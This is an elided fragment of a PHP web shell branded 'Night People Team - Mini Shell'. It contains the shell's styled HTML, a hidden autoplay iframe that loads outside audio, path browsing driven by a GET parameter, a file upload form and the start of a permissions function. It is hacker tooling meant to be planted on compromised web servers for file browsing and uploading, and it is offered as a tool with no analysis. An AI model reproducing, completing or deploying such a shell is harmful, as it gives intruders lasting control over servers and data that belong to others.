...
<title>Night People Team - Mini Shell -</title>
<link rel="icon" href="https://ui-ex.com/images/sadness-drawing-anime-2.png">
<meta name="description" content="Mini Shell Night People Team">
<iframe width="0" height="0" scrolling="no" frameborder="no" allow="autoplay" src="https://1.top4top.net/m_1283v24dh0.mp3" ></iframe>
<style>
body{
font-family: "Chewy";
...
<body>
<br><center><img src="http://my.msk.co.com/uploads/1562680238.png" width="300" /></center>
<h1><center><font color="aqua">Night People Team - Mini Shell -</font></center></h1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><font color="yellow">Path :</font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
...
<font color="yellow">File Upload :</font> <input type="file" name="file" />
...
echo '<center><br/><font color="yellow" size="6">Coding Life In Your <font color="red">Dream<br><font color="white">Created?Naruto-Kun.</center>
</body>
</html>';
function perms($file){
